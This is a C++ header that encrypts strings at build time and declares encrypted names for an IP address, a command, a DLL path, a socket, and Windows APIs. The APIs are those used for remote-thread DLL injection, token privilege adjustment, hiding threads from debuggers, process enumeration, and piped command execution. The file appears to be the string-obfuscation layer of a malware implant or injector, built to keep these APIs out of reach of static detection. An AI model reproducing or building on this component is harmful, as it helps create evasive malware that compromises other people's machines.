#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i + 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i * BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 213)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 134, 146, 107, 230, 30, 211, 123, 136, 214, 142, 146, 76, 167, 117, 161, 174 };

typedef struct EncryptedString {
    unsigned char* data;
    size_t length;
} EncryptedString;

extern EncryptedString str_ip;
extern EncryptedString str_cmd;
extern EncryptedString str_dllPath;
extern EncryptedString str_socket;
extern EncryptedString str_NtSetInformationThread;
extern EncryptedString str_GetCurrentThread;
extern EncryptedString str_Sleep;
extern EncryptedString str_OpenProcess;
extern EncryptedString str_VirtualAllocEx;
extern EncryptedString str_WriteProcessMemory;
extern EncryptedString str_LoadLibraryA;
extern EncryptedString str_CreateRemoteThread;
extern EncryptedString str_CloseHandle;
extern EncryptedString str_LookupPrivilegeValueA;
extern EncryptedString str_GetLastError;
extern EncryptedString str_AdjustTokenPrivileges;
extern EncryptedString str_OpenProcessToken;
extern EncryptedString str_GetCurrentProcess;
extern EncryptedString str_CreateToolhelp32Snapshot;
extern EncryptedString str_Process32First;
extern EncryptedString str_Process32Next;
extern EncryptedString str_CreatePipe;
extern EncryptedString str_SetHandleInformation;
extern EncryptedString str_ReadFile;
extern EncryptedString str_FormatMessageA;
extern EncryptedString str_LocalFree;
extern EncryptedString str_CreateProcessA;
extern EncryptedString str_kernel32;
extern EncryptedString str_ntdll;
extern EncryptedString str_advapi32;
extern EncryptedString str_ws2_32;
extern EncryptedString str_user32;
